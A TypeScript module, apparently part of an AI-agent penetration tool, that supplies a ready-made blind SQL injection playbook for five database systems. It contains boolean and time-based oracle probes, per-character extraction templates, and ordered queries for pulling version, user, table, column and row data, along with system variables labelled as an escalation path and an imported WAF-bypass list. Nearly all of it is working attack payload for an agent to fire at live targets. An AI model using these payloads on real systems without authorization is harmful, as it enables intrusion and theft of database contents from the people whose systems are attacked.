/** Blind SQL injection metadata engine — deterministic payload playbook.
 *
 *  When a sink returns no error/result (pure boolean or time oracle), the
 *  agent extracts database metadata bit-by-bit. This module is the DETERMINISTIC
 *  data layer: the oracle-confirmation probes, the per-DBMS metadata query
 *  targets (version → database → user → tables → columns → data), the
 *  character-extraction template, and the WAF-bypass map. The LLM reasons about
 *  the live requests (send, read byte-count/status/timing, binary-search the
 *  charset); this module supplies the correct payloads per DBMS.
 */

export type BlindSqliDbms = "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite";

import { WAF_BYPASS_FLAT } from "./waf-bypass.js";

/** WAF/IPS bypass techniques (comprehensive — see src/waf-bypass.ts). */
export const WAF_BYPASS: string[] = WAF_BYPASS_FLAT;

export interface BlindSqliPlaybook {
  dbms: BlindSqliDbms;
  /** Confirm a clean TRUE/FALSE (boolean) or time differential BEFORE extracting. */
  oracle: {
    boolean_true: string;
    boolean_false: string;
    time_true: string;
    time_false: string;
    note: string;
  };
  /** Character-extraction template. {query}=metadata SQL expr, {pos}=1-based
   *  char index, {char}=candidate char, {sec}=sleep seconds. */
  extraction: {
    boolean: string;
    time: string;
    method: string;
  };
  metadata: {
    version: string[];
    current_db: string[];
    current_user: string[];
    /** High-value system variables / configuration (recon + escalation path:
     *  datadir/log files → file read/write, hostname → internal recon). */
    system_vars?: string[];
    tables: string[];
    columns: string[];
    data: string[];
  };
}

/** WAF/IPS bypass techniques — see src/waf-bypass.ts for the full categorized map. */
// WAF_BYPASS re-exported at the top of this file (imports WAF_BYPASS_FLAT).

/** Oracle confirmation probes — establish the TRUE/FALSE differential. */
function oracleConfirm(dbms: BlindSqliDbms): BlindSqliPlaybook["oracle"] {
  const time = dbms === "mssql" ? "WAITFOR DELAY '0:0:5'" : dbms === "postgresql" ? "pg_sleep(5)" : dbms === "oracle" ? "dbms_lock.sleep(5)" : dbms === "sqlite" ? "randomblob(500000000)" : "SLEEP(5)";
  return {
    boolean_true: `' AND 1=1-- -`,
    boolean_false: `' AND 1=2-- -`,
    time_true: `' AND IF(1=1,${time},0)-- -`,
    time_false: `' AND IF(1=2,${time},0)-- -`,
    note: "TRUE vs FALSE differential = byte-count (e.g. TRUE=2814 vs FALSE=0), status code, or timing. A clean oracle is the prerequisite for every extraction below.",
  };
}

/** Per-DBMS metadata query targets + extraction template. */
function playbook(dbms: BlindSqliDbms): BlindSqliPlaybook {
  switch (dbms) {
    case "mysql":
      return {
        dbms,
        oracle: oracleConfirm(dbms),
        extraction: {
          boolean: `' AND SUBSTRING(({query}),{pos},1)='{char}'-- -`,
          time: `' AND IF(SUBSTRING(({query}),{pos},1)='{char}',SLEEP({sec}),0)-- -`,
          method: "binary-search the charset (7 requests/char) or linear scan over [a-z0-9_.@/-]. Extract version → database → user → system vars → tables → columns → data, in that order.",
        },
        metadata: {
          version: ["@@version", "VERSION()"],
          current_db: ["DATABASE()"],
          current_user: ["USER()", "CURRENT_USER()"],
          system_vars: [
            "@@version_compile_os", "@@version_compile_machine", "@@hostname", "@@socket",
            "@@datadir", "@@basedir", "@@tmpdir", "@@secure_file_priv",
            "@@log_error", "@@general_log", "@@general_log_file", "@@slow_query_log_file",
            "@@character_set_server", "@@collation_server",
          ],
          tables: [
            "(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {i},1)",
            "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())",
          ],
          columns: [
            "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' LIMIT {i},1)",
          ],
          data: ["(SELECT {c} FROM {t} LIMIT {i},1)"],
        },
      };
    case "postgresql":
      return {
        dbms,
        oracle: oracleConfirm(dbms),
        extraction: {
          boolean: `' AND SUBSTRING(({query})::text,{pos},1)='{char}'--`,
          time: `' AND CASE WHEN SUBSTRING(({query})::text,{pos},1)='{char}' THEN pg_sleep({sec}) ELSE pg_sleep(0) END--`,
          method: "binary-search the charset. version() → current_database() → current_user → tables → columns → data.",
        },
        metadata: {
          version: ["version()"],
          current_db: ["current_database()"],
          current_user: ["current_user", "session_user"],
          system_vars: ["current_setting('data_directory')", "current_setting('log_directory')", "current_setting('server_version')"],
          tables: [
            "(SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET {i})",
            "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_schema())",
          ],
          columns: [
            "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' LIMIT 1 OFFSET {i})",
          ],
          data: ["(SELECT {c} FROM {t} LIMIT 1 OFFSET {i})"],
        },
      };
    case "mssql":
      return {
        dbms,
        oracle: oracleConfirm(dbms),
        extraction: {
          boolean: `' AND SUBSTRING(({query}),{pos},1)='{char}'--`,
          time: `' AND IF(SUBSTRING(({query}),{pos},1)='{char}',1,0)=1 WAITFOR DELAY '0:0:{sec}'--`,
          method: "binary-search the charset. @@version → DB_NAME() → SYSTEM_USER → tables → columns → data.",
        },
        metadata: {
          version: ["@@version"],
          current_db: ["DB_NAME()"],
          current_user: ["SYSTEM_USER", "CURRENT_USER"],
          system_vars: ["SERVERPROPERTY('MachineName')", "SERVERPROPERTY('InstanceName')", "SERVERPROPERTY('IsIntegratedSecurityOnly')"],
          tables: [
            "(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)",
            "(SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE')",
          ],
          columns: [
            "(SELECT name FROM syscolumns WHERE id=OBJECT_ID('{t}') ORDER BY colid OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)",
          ],
          data: ["(SELECT TOP 1 {c} FROM {t} ORDER BY {c} OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)"],
        },
      };
    case "oracle":
      return {
        dbms,
        oracle: oracleConfirm(dbms),
        extraction: {
          boolean: `' AND SUBSTR(({query}),{pos},1)='{char}'--`,
          time: `' AND CASE WHEN SUBSTR(({query}),{pos},1)='{char}' THEN dbms_lock.sleep({sec}) ELSE dbms_lock.sleep(0) END--`,
          method: "binary-search the charset. banner → user → tables → columns → data (Oracle has no stacked info_schema; use all_tables/all_tab_columns).",
        },
        metadata: {
          version: ["(SELECT banner FROM v$version WHERE ROWNUM=1)"],
          current_db: ["(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual)"],
          current_user: ["(SELECT user FROM dual)"],
          system_vars: ["(SELECT SYS_CONTEXT('USERENV','INSTANCE_NAME') FROM dual)", "(SELECT SYS_CONTEXT('USERENV','HOST') FROM dual)"],
          tables: ["(SELECT table_name FROM (SELECT table_name FROM all_tables ORDER BY table_name) WHERE ROWNUM={i})"],
          columns: ["(SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name='{t}' ORDER BY column_id) WHERE ROWNUM={i})"],
          data: ["(SELECT {c} FROM (SELECT {c} FROM {t}) WHERE ROWNUM={i})"],
        },
      };
    case "sqlite":
      return {
        dbms,
        oracle: oracleConfirm(dbms),
        extraction: {
          boolean: `' AND SUBSTR(({query}),{pos},1)='{char}'--`,
          time: `' AND CASE WHEN SUBSTR(({query}),{pos},1)='{char}' THEN randomblob(500000000) ELSE 0 END--`,
          method: "binary-search the charset. sqlite_version() → tables (sqlite_master) → columns (PRAGMA) → data.",
        },
        metadata: {
          version: ["sqlite_version()"],
          current_db: ["(SELECT file FROM pragma_database_list LIMIT 1)"],
          current_user: ["(SELECT 'sqlite')"],
          tables: ["(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i})", "(SELECT COUNT(*) FROM sqlite_master WHERE type='table')"],
          columns: ["(SELECT sql FROM sqlite_master WHERE type='table' AND name='{t}')"],
          data: ["(SELECT {c} FROM {t} LIMIT 1 OFFSET {i})"],
        },
      };
  }
}

const PLAYBOOKS: Record<BlindSqliDbms, BlindSqliPlaybook> = {
  mysql: playbook("mysql"),
  postgresql: playbook("postgresql"),
  mssql: playbook("mssql"),
  oracle: playbook("oracle"),
  sqlite: playbook("sqlite"),
};

/** Return the full blind-SQLi playbook for a DBMS (oracle + WAF bypass +
 *  extraction template + metadata targets). */
export function blindSqli(dbms: string): BlindSqliPlaybook | null {
  return PLAYBOOKS[(dbms ?? "").toLowerCase() as BlindSqliDbms] ?? null;
}

/** List supported DBMS playbooks. */
export function listBlindSqliDbms(): BlindSqliDbms[] {
  return Object.keys(PLAYBOOKS) as BlindSqliDbms[];
}
